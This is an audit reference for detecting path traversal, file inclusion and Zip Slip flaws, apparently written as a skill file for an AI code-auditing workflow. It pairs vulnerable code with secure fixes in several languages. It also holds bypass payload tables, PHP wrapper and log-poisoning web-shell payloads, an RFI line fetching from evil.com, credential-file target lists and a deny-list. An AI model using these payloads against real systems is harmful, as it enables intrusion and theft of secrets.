<!-- Adapted audit reference. Apply its vulnerability-specific checks through the Antigravity BALLS workflow and evidence rules. -->

# Path Traversal / Local File Inclusion Detection Skill

## Overview

## ⚠️ Mandatory: Concrete Data Flow Proof Required

**DO NOT report a finding based on pattern-matching alone.** For every potential vulnerability you identify:

1. **Find the SINK** (dangerous function/API call)
2. **Trace all callers** — use `codegraph callers <symbol>` or `codegraph explore "<flow question>"` to identify call sites and execution paths.
3. **For each caller, trace the argument origin**:
   - Hardcoded/constant value → **Skip** (not a vulnerability, just bad practice)
   - Config file / admin-only source → **Skip** (not exploitable from internet)
   - User-controlled input (HTTP request, RPC, file upload, etc.) → **Investigate further**
   - Another service / database → **Trace upstream** to find the ultimate source
4. **Document the complete path**: SOURCE (file:line) → INTERMEDIATES (file:line each) → SINK (file:line)
5. **Verify no sanitization** between source and sink that would prevent exploitation

**"If an attacker controls X" is NOT a valid finding. You must prove X is user-controlled by tracing the actual code.**

## Reachable source and artifact exposure

Inventory all routes and framework/server configuration that can return files: wildcard or catch-all handlers, `send_file`/`send_from_directory`, download endpoints, static roots, archive extraction, and framework debug/source-map endpoints. Trace request paths through decoding, canonicalization, root containment, symlink behavior where configured, authorization, and the final file operation. Check whether repository files such as configuration, databases, backups, logs, `.git` metadata, or build artifacts fall under the served root; their presence in the checkout is not a vulnerability unless the application or checked-in serving configuration makes them reachable.

For each exposure, identify the exact file class and reader permissions established by source. Distinguish traversal outside an intended root from a catch-all route that intentionally serves too broad a root; both may disclose files, but the remediation and CWE can differ. Do not assume the web server blocks dotfiles or that a reverse proxy removes a route unless repository evidence shows that behavior.

Path traversal (also called directory traversal) vulnerabilities allow an attacker to read, write, or include files outside the intended directory by manipulating file path inputs. These flaws arise when applications use user-controlled data to construct filesystem paths without proper validation or canonicalization.

**Impact ranges from high to critical:**
- **Arbitrary file read** — access to `/etc/passwd`, `/etc/shadow`, application source code, database credentials, API keys, cloud metadata endpoints (e.g., reading mounted service-account tokens in containers).
- **Code execution via LFI/RFI** — including attacker-controlled files (log poisoning, uploaded files, PHP wrappers, remote URLs) to achieve remote code execution.
- **Data exfiltration** — reading database files, backup archives, private keys, TLS certificates.
- **Configuration and credential theft** — `.env`, `web.config`, `appsettings.json`, `application.yml`, `wp-config.php`, `.git/config`, Kubernetes secrets mounted as files.
- **Denial of service** — reading `/dev/urandom`, `/dev/zero`, or extremely large files.

Path traversal is consistently ranked in the OWASP Top 10 (A01:2021 Broken Access Control). It remains prevalent because developers frequently concatenate user input into file paths without realizing the security implications.

---

## Vulnerability Patterns

### 1. Directory Traversal via String Concatenation

The most common pattern: user input is concatenated directly into a file path.

**Python — Vulnerable:**
```python
# VULNERABLE: direct concatenation
filename = request.args.get('file')
with open('/uploads/' + filename) as f:      # ../../../etc/passwd
    return f.read()

# VULNERABLE: f-string / format
path = f"/var/data/{user_input}"
content = open(path).read()
```

**Python — Secure:**
```python
import os

filename = request.args.get('file')
base_dir = os.path.realpath('/uploads')
requested = os.path.realpath(os.path.join(base_dir, filename))

if not requested.startswith(base_dir + os.sep):
    abort(403)

with open(requested) as f:
    return f.read()
```

**Java — Vulnerable:**
```java
// VULNERABLE: string concatenation
String filename = request.getParameter("file");
File file = new File("/uploads/" + filename);
FileInputStream fis = new FileInputStream(file);
```

**Java — Secure:**
```java
String filename = request.getParameter("file");
Path base = Paths.get("/uploads").toRealPath();
Path requested = base.resolve(filename).toRealPath();

if (!requested.startsWith(base)) {
    throw new SecurityException("Path traversal attempt");
}
FileInputStream fis = new FileInputStream(requested.toFile());
```

**JavaScript/Node — Vulnerable:**
```javascript
// VULNERABLE: direct concatenation
app.get('/files', (req, res) => {
    const filePath = './uploads/' + req.query.name;
    res.sendFile(filePath);
});

// VULNERABLE: template literal
const content = fs.readFileSync(`./data/${req.params.id}`);
```

**JavaScript/Node — Secure:**
```javascript
const path = require('path');
const baseDir = path.resolve('./uploads');
const requested = path.resolve(baseDir, req.query.name);

if (!requested.startsWith(baseDir + path.sep)) {
    return res.status(403).send('Forbidden');
}
res.sendFile(requested);
```

**C# — Vulnerable:**
```csharp
// VULNERABLE: Path.Combine does NOT prevent traversal
string filename = Request.Query["file"];
string path = Path.Combine(@"C:\uploads", filename);
string content = File.ReadAllText(path);
```

**C# — Secure:**
```csharp
string filename = Request.Query["file"];
string baseDir = Path.GetFullPath(@"C:\uploads");
string fullPath = Path.GetFullPath(Path.Combine(baseDir, filename));

if (!fullPath.StartsWith(baseDir + Path.DirectorySeparatorChar))
    return Forbid();

string content = File.ReadAllText(fullPath);
```

**Go — Vulnerable:**
```go
// VULNERABLE: filepath.Join does NOT prevent traversal with ../
func handler(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("file")
    path := filepath.Join("/uploads", name)
    http.ServeFile(w, r, path)
}
```

**Go — Secure:**
```go
func handler(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("file")
    baseDir, _ := filepath.Abs("/uploads")
    requested, _ := filepath.Abs(filepath.Join(baseDir, name))

    if !strings.HasPrefix(requested, baseDir+string(filepath.Separator)) {
        http.Error(w, "Forbidden", http.StatusForbidden)
        return
    }
    http.ServeFile(w, r, requested)
}
```

**PHP — Vulnerable:**
```php
// VULNERABLE: direct concatenation
$file = $_GET['file'];
readfile("/uploads/" . $file);
```

**PHP — Secure:**
```php
$file = $_GET['file'];
$baseDir = realpath('/uploads');
$requested = realpath($baseDir . '/' . $file);

if ($requested === false || strpos($requested, $baseDir . DIRECTORY_SEPARATOR) !== 0) {
    http_response_code(403);
    exit;
}
readfile($requested);
```

**Ruby — Vulnerable:**
```ruby
# VULNERABLE: string interpolation
filename = params[:file]
send_file "/uploads/#{filename}"
```

**Ruby — Secure:**
```ruby
filename = params[:file]
base_dir = File.realpath('/uploads')
requested = File.realpath(File.join(base_dir, filename))

unless requested.start_with?(base_dir + '/')
  halt 403, 'Forbidden'
end
send_file requested
```

### 2. `os.path.join()` / `Path.Combine()` Misuse

A critical and widely misunderstood pitfall: in Python, if any component is an absolute path, all previous components are discarded.

```python
import os
# Developer expects: /uploads/reports/file.txt
# Attacker sends user_input = "/etc/passwd"
os.path.join("/uploads/reports", "/etc/passwd")
# Result: "/etc/passwd"  — base is completely ignored!
```

The same applies to C# `Path.Combine`:
```csharp
Path.Combine(@"C:\uploads", @"C:\windows\system32\config\sam")
// Result: "C:\windows\system32\config\sam"
```

And Go `filepath.Join` does NOT exhibit this behavior (it cleans but does not replace), but it still resolves `../` sequences:
```go
filepath.Join("/uploads", "../../etc/passwd")
// Result: "/etc/passwd"
```

### 3. Local File Inclusion (LFI)

LFI occurs when user input controls which file is included/executed by the application.

**PHP — Classic LFI:**
```php
// VULNERABLE: user controls included file
$page = $_GET['page'];
include($page . '.php');              // page=../../etc/passwd%00
include_once($_GET['module']);
require($_POST['template']);
```

**High-value LFI targets:**
- `/etc/passwd`, `/etc/shadow` — user enumeration, credential access
- `/proc/self/environ` — environment variables, may contain secrets
- `/proc/self/cmdline` — reveals running process arguments
- `/var/log/apache2/access.log` — log poisoning for RCE
- `/var/log/auth.log` — SSH log poisoning
- `web.config`, `.env`, `appsettings.json` — application secrets
- `.git/config`, `.git/HEAD` — source code access
- `~/.ssh/id_rsa`, `~/.aws/credentials` — key material

**LFI to RCE via log poisoning:**
1. Attacker sends request with `<?php system($_GET['cmd']); ?>` in User-Agent header.
2. Web server logs the malicious User-Agent to access log.
3. Attacker includes the log file via LFI: `?page=../../../var/log/apache2/access.log`.
4. PHP executes the injected code from the log.

**PHP wrapper abuse:**
```
# Read source code as base64 (bypasses execution)
php://filter/convert.base64-encode/resource=config.php

# Execute POST body as PHP
php://input

# Execute inline data
data://text/plain,<?php phpinfo(); ?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==

# Read zip contents
zip://uploads/evil.zip#shell.php
phar://uploads/evil.phar/shell.php
```

### 4. Remote File Inclusion (RFI)

RFI allows including files from remote servers, typically leading to immediate RCE.

```php
// VULNERABLE: if allow_url_include=On in php.ini
include($_GET['page']);
// Attacker: ?page=http://evil.com/shell.php

// VULNERABLE: template loading from URL
$template = file_get_contents($_GET['template_url']);
eval('?>' . $template);
```

**Detection indicator:** Check `php.ini` for `allow_url_include = On` and `allow_url_fopen = On`.

### 5. Traversal Sequences and Bypass Patterns

When auditing, look for code that attempts to filter traversal but can be bypassed:

| Technique | Payload | Notes |
|---|---|---|
| Basic traversal | `../`, `..\\` | Simplest form |
| URL-encoded | `%2e%2e%2f`, `%2e%2e/`, `..%2f` | Bypasses naive string filters |
| Double URL-encoded | `%252e%252e%252f` | Bypasses single-decode filters |
| Null byte | `../../../etc/passwd%00.png` | Older PHP (<5.3.4), older Java |
| Overlong UTF-8 | `..%c0%af`, `..%ef%bc%8f` | Bypasses some WAFs/filters |
| OS-specific | `..\/`, `..\\/`, `../\` | Mixed separator confusion |
| UNC path (Windows) | `\\evil-server\share\file` | Potential SSRF + credential leak |
| Path truncation | `../[256+ chars]` | Windows MAX_PATH (260 chars) |
| Dot stripping bypass | `....//....//etc/passwd` | If filter removes `../` once |
| Backtracking | `valid-dir/../../../etc/passwd` | Starts in valid dir, escapes |

**Vulnerable filter patterns (easy to bypass):**
```python
# INSECURE: single replacement — ....// becomes ../
cleaned = user_input.replace("../", "")

# INSECURE: only checks forward slash
if "..\\" not in user_input:  # bypassed with ../

# INSECURE: blacklist approach
if "../" not in filename:     # bypassed with ..%2f, ....//
    open("/data/" + filename)
```

### 6. Zip Slip

Zip Slip occurs when archive extraction does not validate that extracted file paths stay within the target directory. A malicious archive contains entries with names like `../../etc/cron.d/backdoor`.

**Java — Vulnerable:**
```java
// VULNERABLE: no validation of entry path
ZipFile zip = new ZipFile(uploadedFile);
Enumeration<? extends ZipEntry> entries = zip.entries();
while (entries.hasMoreElements()) {
    ZipEntry entry = entries.nextElement();
    // entry.getName() could be "../../etc/cron.d/backdoor"
    File outFile = new File(destDir, entry.getName());
    Files.copy(zip.getInputStream(entry), outFile.toPath());
}
```

**Java — Secure:**
```java
ZipEntry entry = entries.nextElement();
Path targetPath = destDir.toPath().resolve(entry.getName()).normalize();
if (!targetPath.startsWith(destDir.toPath().normalize())) {
    throw new SecurityException("Zip Slip detected: " + entry.getName());
}
```

**Python — Vulnerable:**
```python
# VULNERABLE: extractall does not validate paths in older Python
import zipfile
with zipfile.ZipFile(uploaded_file) as zf:
    zf.extractall('/tmp/uploads')  # entries with ../ escape target
```

**Python — Secure:**
```python
import zipfile, os

def safe_extract(zip_path, dest):
    with zipfile.ZipFile(zip_path) as zf:
        for entry in zf.namelist():
            target = os.path.realpath(os.path.join(dest, entry))
            if not target.startswith(os.path.realpath(dest) + os.sep):
                raise ValueError(f"Zip Slip attempt: {entry}")
        zf.extractall(dest)
```

**Node — Vulnerable:**
```javascript
// VULNERABLE: no path validation
const unzipper = require('unzipper');
fs.createReadStream('upload.zip')
  .pipe(unzipper.Extract({ path: './uploads' }));
// Malicious entry "../../../etc/cron.d/backdoor" escapes uploads/
```

**Go — Vulnerable:**
```go
// VULNERABLE: no path validation on zip entry
for _, f := range reader.File {
    path := filepath.Join(dest, f.Name) // f.Name could contain ../
    os.MkdirAll(filepath.Dir(path), 0755)
    outFile, _ := os.Create(path)
    // ... write contents
}
```

**Also check tar extraction** — tar entries can contain `../` in filenames and symlinks pointing outside the extraction directory.

### 7. Symlink Attacks

**Archive containing symlinks:**
```bash
# Attacker creates malicious tar:
ln -s /etc/passwd link.txt
tar cf evil.tar link.txt
# When extracted, link.txt → /etc/passwd; reading link.txt reads /etc/passwd
```

**TOCTOU race condition:**
```python
# VULNERABLE: check-then-use race
path = os.path.join(upload_dir, filename)
if os.path.isfile(path) and not os.path.islink(path):  # check
    # Between check and open, attacker replaces file with symlink
    with open(path) as f:  # use — now reads symlink target
        return f.read()
```

**Detection:** Look for `os.path.islink()` or `File.isSymbolicLink()` checks that are separate from the actual file operation (TOCTOU gap).

### 8. Path Canonicalization Issues

**Windows-specific:**
```
file.txt::$DATA          — NTFS Alternate Data Stream; may bypass extension checks
file.txt.                — trailing dot stripped by Windows; bypasses extension filter
file.txt...:::           — multiple trailing dots/colons
FILENA~1.TXT             — 8.3 short name; bypasses full-name filters
file.txt . . .           — spaces + dots stripped
C:\uploads\..\..\windows\system32\config\sam — backslash traversal
```

**Unix-specific:**
```
/proc/self/cwd           — symlink to process working directory
/proc/self/root          — symlink to filesystem root
/dev/fd/N                — access open file descriptors
//etc/passwd             — double leading slash (usually normalized, but test)
```

**Java — `normalize()` vs `toRealPath()`:**
```java
// INSECURE: normalize() resolves .. syntactically but does NOT resolve symlinks
Path p = Paths.get("/uploads/../etc/passwd").normalize();
// Result: /etc/passwd — traversal NOT prevented, just cleaned up

// SECURE: toRealPath() resolves symlinks and requires file to exist
Path p = Paths.get("/uploads/user_input").toRealPath();
// Resolves symlinks, then verify with startsWith()
```

**Python — `normpath()` vs `realpath()`:**
```python
# INSECURE: normpath resolves .. syntactically, does NOT resolve symlinks
os.path.normpath("/uploads/../etc/passwd")  # → "/etc/passwd"

# SECURE: realpath resolves symlinks and .. against the actual filesystem
os.path.realpath("/uploads/user_input")
# Then verify: result.startswith(expected_base + os.sep)
```

---

## File Operation Functions to Audit

Scan for these functions where any argument may derive from user input:

### Python
```
open(), os.path.join(), os.path.abspath(), os.path.normpath()
shutil.copy(), shutil.copy2(), shutil.move(), shutil.copytree()
pathlib.Path(), pathlib.Path.open(), pathlib.Path.read_text(), pathlib.Path.read_bytes()
flask.send_file(), flask.send_from_directory()
django.http.FileResponse(), django.views.static.serve()
zipfile.ZipFile.extractall(), zipfile.ZipFile.extract()
tarfile.TarFile.extractall(), tarfile.TarFile.extract()
os.listdir(), os.scandir(), glob.glob()
io.open(), codecs.open()
```

### Java
```
new File(), new FileInputStream(), new FileOutputStream(), new FileReader()
Paths.get(), Path.resolve(), Path.of()
Files.readAllBytes(), Files.readAllLines(), Files.readString()
Files.write(), Files.copy(), Files.move(), Files.newInputStream()
ClassLoader.getResource(), ClassLoader.getResourceAsStream()
ServletContext.getRealPath(), ServletContext.getResourceAsStream()
new ZipFile(), ZipEntry.getName()
new JarFile(), JarEntry.getName()
```

### JavaScript / Node.js
```
fs.readFile(), fs.readFileSync(), fs.createReadStream()
fs.writeFile(), fs.writeFileSync(), fs.createWriteStream()
fs.promises.readFile(), fs.promises.writeFile()
path.join(), path.resolve(), path.normalize()
express: res.sendFile(), res.download(), express.static()
require() with dynamic paths
child_process.exec/spawn with file path arguments
```

### C# / .NET
```
File.ReadAllText(), File.ReadAllBytes(), File.ReadAllLines()
File.WriteAllText(), File.WriteAllBytes(), File.OpenRead()
FileStream(), StreamReader(), StreamWriter()
Path.Combine(), Path.GetFullPath()
Directory.GetFiles(), Directory.GetDirectories(), Directory.EnumerateFiles()
System.IO.Compression.ZipFile.ExtractToDirectory()
ZipArchiveEntry.FullName
PhysicalFileProvider(), IFileProvider.GetFileInfo()
```

### Go
```
os.Open(), os.OpenFile(), os.Create(), os.ReadFile()
os.ReadDir(), os.Stat(), os.Lstat()
filepath.Join(), filepath.Clean(), filepath.Abs()
io.ReadAll(), bufio.NewReader()
http.ServeFile(), http.FileServer(), http.Dir()
archive/zip: f.Name in zip.Reader
archive/tar: header.Name in tar.Reader
```

### PHP
```
include(), include_once(), require(), require_once()
file_get_contents(), file_put_contents()
fopen(), fread(), fwrite(), fclose()
readfile(), file(), highlight_file(), show_source()
move_uploaded_file(), copy(), rename(), unlink()
ZipArchive::extractTo()
simplexml_load_file(), DOMDocument::load()
```

### Ruby
```
File.read(), File.open(), File.write(), File.binread()
IO.read(), IO.readlines(), IO.foreach()
FileUtils.cp(), FileUtils.mv(), FileUtils.copy_stream()
send_file(), send_data()
Kernel.open() — especially dangerous: Kernel.open("|cmd") executes commands
Pathname.new(), Dir.glob(), Dir.entries()
Zip::File.open(), Gem::Package::TarReader
```

---

## Detection Methodology

### Step 1: Identify File-Serving and File-Reading Endpoints

```
grep -rn "send_file\|sendFile\|send_from_directory\|ServeFile\|readFile\|ReadAllText\|file_get_contents\|readfile\|File\.read\|File\.open" --include="*.py" --include="*.java" --include="*.js" --include="*.ts" --include="*.cs" --include="*.go" --include="*.php" --include="*.rb"
```

### Step 2: Trace User Input into File Paths

Look for parameters, query strings, headers, or request body data flowing into file path construction:

```
grep -rn "request\.\(args\|form\|params\|GET\|POST\|query\|body\|headers\)" --include="*.py" --include="*.js" --include="*.ts" --include="*.php" --include="*.rb" | grep -i "file\|path\|name\|dir\|folder\|template\|page\|doc\|resource\|module\|include\|load"
```

### Step 3: Find Path Construction with User Input

```
grep -rn "os\.path\.join\|path\.join\|path\.resolve\|filepath\.Join\|Path\.Combine\|Paths\.get\|new File(" --include="*.py" --include="*.java" --include="*.js" --include="*.ts" --include="*.cs" --include="*.go"
```

### Step 4: Check for Dangerous PHP Includes

```
grep -rn "include\s*(\|include_once\s*(\|require\s*(\|require_once\s*(" --include="*.php" | grep -v "vendor/"
```

### Step 5: Find Archive Extraction without Validation

```
grep -rn "extractall\|extractTo\|ZipEntry\|ZipFile\|zipfile\|unzipper\|tar\.Reader\|TarFile\|archive/zip\|ZipArchiveEntry" --include="*.py" --include="*.java" --include="*.js" --include="*.ts" --include="*.cs" --include="*.go" --include="*.php" --include="*.rb"
```

### Step 6: Verify Absence of Proper Validation

For each finding, check whether the code:
1. Resolves the path to its canonical/real form (`realpath`, `toRealPath`, `filepath.Abs`).
2. Validates the resolved path starts with the expected base directory.
3. Rejects or strips directory components from filenames.
4. Uses an allow-list of permitted files.

If none of these defenses are present, flag as a finding.

### Step 7: Check for Weak/Bypassable Filters

```
grep -rn "replace.*\.\./\|replace.*\.\.\\\\\|indexOf.*\.\.\|contains.*\.\.\|str_replace.*\.\." --include="*.py" --include="*.java" --include="*.js" --include="*.ts" --include="*.cs" --include="*.go" --include="*.php"
```

Single-pass replacement of `../` is always bypassable with `....//`.

---

## Common Sinks and Sources

### Sources (User-Controlled Input)
| Source | Languages / Frameworks |
|---|---|
| URL path parameters | All web frameworks (`/files/:name`, `{filename}`) |
| Query parameters | `request.args`, `req.query`, `$_GET`, `Request.Query` |
| POST body / form data | `request.form`, `req.body`, `$_POST` |
| HTTP headers | `Content-Disposition`, `X-Filename`, custom headers |
| File upload filenames | Multipart upload original filename field |
| Cookie values | Rare but possible — file path stored in cookie |
| Database values | Previously stored user input retrieved and used in paths |
| Archive entry names | `ZipEntry.getName()`, `TarInfo.name`, `entry.fileName` |
| API request fields | JSON/XML body fields specifying file references |

### Sinks (Dangerous Operations)
| Category | Functions |
|---|---|
| File read | `open()`, `readFile()`, `File.ReadAllText()`, `file_get_contents()` |
| File write | `writeFile()`, `File.WriteAllText()`, `fwrite()` |
| File serve | `send_file()`, `res.sendFile()`, `http.ServeFile()` |
| File include | `include()`, `require()`, `eval()`, dynamic `import()` |
| File delete | `os.remove()`, `fs.unlink()`, `File.Delete()` |
| Directory listing | `os.listdir()`, `fs.readdir()`, `Directory.GetFiles()` |
| Archive extraction | `extractall()`, `ZipFile.ExtractToDirectory()` |
| File copy/move | `shutil.copy()`, `Files.copy()`, `FileUtils.cp()` |

---

## False Positive Indicators

Flag a finding as a likely false positive if ANY of the following hold:

1. **Allow-list validation** — The filename/path is checked against a static list of permitted values before use.
   ```python
   ALLOWED = {'report.pdf', 'summary.pdf', 'invoice.pdf'}
   if filename not in ALLOWED:
       abort(404)
   ```

2. **Canonical path verification** — The code resolves the path with `realpath`/`toRealPath`/`filepath.Abs` AND verifies the result starts with the expected base directory (prefix check with trailing separator).
   ```python
   real = os.path.realpath(os.path.join(base, user_input))
   if not real.startswith(os.path.realpath(base) + os.sep):
       abort(403)
   ```

3. **Basename extraction** — Only the filename component is used, stripping all directory information.
   ```python
   safe_name = os.path.basename(user_input)   # "../../etc/passwd" → "passwd"
   ```

4. **Static/hardcoded paths** — The path is constructed entirely from configuration or constants, with no user input involved.

5. **Integer/UUID-based file lookup** — User provides an ID, and the actual path is resolved from a database or mapping table.
   ```python
   file_record = db.query("SELECT path FROM files WHERE id = ?", int(file_id))
   ```

6. **Chroot / container isolation** — File operations occur inside a chroot jail, dedicated container, or sandbox that prevents escaping the intended directory even if traversal succeeds.

7. **Framework-provided safe methods** — Some frameworks have built-in protections (e.g., Django's `FilePathField` with `allow_folders=False`, Rails `send_file` with `disposition` and `:root` restriction). Verify the framework version includes the protection.

---

## Severity Assessment

| Scenario | Severity | CVSS Range | Justification |
|---|---|---|---|
| Arbitrary file read (server-side) | **High** | 7.5 – 8.6 | Read sensitive configs, keys, source code |
| LFI leading to RCE (log poisoning, wrappers) | **Critical** | 9.0 – 9.8 | Full server compromise |
| RFI (remote file inclusion) | **Critical** | 9.8 | Immediate remote code execution |
| Zip Slip with write to web root | **Critical** | 9.0 – 9.8 | Write webshell, achieve RCE |
| Zip Slip with write outside web root | **High** | 7.5 – 8.8 | Overwrite configs, cron, authorized_keys |
| Path traversal in file upload filename | **High** | 7.5 – 8.6 | Write files to arbitrary locations |
| Traversal limited to non-sensitive directories | **Medium** | 4.3 – 6.5 | Information disclosure, limited scope |
| Traversal with strong compensating controls | **Low** | 2.0 – 3.9 | Defense-in-depth reduces exploitability |
| Directory listing disclosure | **Medium** | 5.3 | Reveals structure, aids further attacks |

**Factors that increase severity:**
- Application runs as root or privileged user
- Cloud environment with mounted secrets (Kubernetes, ECS)
- Combined with file write capability
- No WAF or runtime protection in place
- Application processes sensitive data (PII, financial, healthcare)

**Factors that decrease severity:**
- Read-only access with no sensitive files reachable
- Containerized with minimal filesystem
- Strong OS-level permissions (files not readable by app user)
- WAF with path traversal rules in blocking mode

---

## Remediation Patterns

### 1. Use Basename Only (Strongest for Simple Cases)

Strip all directory components; use only the filename.

```python
safe_name = os.path.basename(user_input)
path = os.path.join(upload_dir, safe_name)
```
```java
String safeName = Paths.get(userInput).getFileName().toString();
```
```javascript
const safeName = path.basename(userInput);
```
```go
safeName := filepath.Base(userInput)
```

### 2. Canonicalize Then Validate (Recommended General Approach)

Resolve the path to its canonical form, then verify it is within the allowed base directory.

```python
base = os.path.realpath(allowed_dir)
target = os.path.realpath(os.path.join(base, user_input))
assert target.startswith(base + os.sep), "Traversal blocked"
```

**Critical:** Always append the path separator to the base before the `startswith` check. Without it, `/uploads-evil/` would pass a check against `/uploads`.

### 3. ID-Based Lookup (Eliminates Path Input Entirely)

Replace file path input with opaque identifiers:

```python
# User sends: GET /files/a3f2b8c1
file_record = db.get("SELECT stored_path FROM files WHERE id = ?", file_id)
if not file_record:
    abort(404)
return send_file(file_record['stored_path'])
```

### 4. Safe Archive Extraction

```python
import zipfile, os

def safe_extract(archive_path, dest_dir):
    dest = os.path.realpath(dest_dir)
    with zipfile.ZipFile(archive_path) as zf:
        for member in zf.namelist():
            member_path = os.path.realpath(os.path.join(dest, member))
            if not member_path.startswith(dest + os.sep):
                raise ValueError(f"Zip Slip: {member}")
        zf.extractall(dest)
```

### 5. Chroot / Sandboxing

For high-risk file operations, isolate the process:

```python
# Unix: chroot to restrict filesystem view
os.chroot('/var/app/uploads')
# Now "/" in the process is /var/app/uploads on the host
```

Or use container isolation, seccomp profiles, or AppArmor/SELinux to limit file access.

### 6. Deny-List of Dangerous Patterns (Defense-in-Depth Only)

Never rely on deny-listing as the primary defense, but it provides an additional layer:

```python
DANGEROUS_PATTERNS = ['..', '%2e', '%2f', '%5c', '\x00', '::$DATA']
if any(p in user_input.lower() for p in DANGEROUS_PATTERNS):
    abort(400)
# Still apply canonicalize-then-validate as primary defense
```

---

## CWE References

| CWE | Name | Description |
|---|---|---|
| **CWE-22** | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | The primary CWE for directory traversal vulnerabilities |
| **CWE-23** | Relative Path Traversal | Traversal using relative path sequences (`../`) |
| **CWE-36** | Absolute Path Traversal | User supplies absolute path that escapes intended directory |
| **CWE-73** | External Control of File Name or Path | User input directly controls file name or path used in filesystem operations |
| **CWE-98** | Improper Control of Filename for Include/Require Statement | PHP include/require with user-controlled filenames (LFI/RFI) |
| **CWE-59** | Improper Link Resolution Before File Access ('Link Following') | Symlink attacks where application follows symbolic links to unintended targets |
| **CWE-61** | UNIX Symbolic Link (Symlink) Following | Unix-specific symlink following vulnerability |

**Related CWEs to also consider:**
- **CWE-434** — Unrestricted Upload of File with Dangerous Type (often combined with path traversal)
- **CWE-426** — Untrusted Search Path (DLL hijacking, PATH manipulation)
- **CWE-427** — Uncontrolled Search Path Element
- **CWE-94** — Improper Control of Generation of Code (RCE via file inclusion)
- **CWE-502** — Deserialization of Untrusted Data (phar:// deserialization in PHP)
